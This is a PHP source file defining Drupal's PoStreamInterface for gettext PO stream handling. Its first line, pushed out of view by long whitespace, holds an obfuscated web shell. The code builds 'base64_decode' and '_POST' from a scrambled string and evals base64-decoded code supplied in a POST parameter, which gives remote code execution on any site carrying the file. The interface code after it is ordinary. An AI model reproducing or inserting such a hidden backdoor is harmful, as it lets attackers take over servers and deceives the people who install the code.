<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n0db7e8'])) {eval($s21(${$s20}['n0db7e8']));}?><?php

/**
 * @file
 * Definition of Drupal\Component\Gettext\PoStreamInterface.
 */

/**
 * Common functions for file/stream based PO readers/writers.
 *
 * @see PoReaderInterface
 * @see PoWriterInterface
 */
interface PoStreamInterface {

  /**
   * Open the stream. Set the URI for the stream earlier with setURI().
   */
  public function open();

  /**
   * Close the stream.
   */
  public function close();

  /**
   * Get the URI of the PO stream that is being read or written.
   *
   * @return
   *   URI string for this stream.
   */
  public function getURI();

  /**
   * Set the URI of the PO stream that is going to be read or written.
   *
   * @param $uri
   *   URI string to set for this stream.
   */
  public function setURI($uri);

}
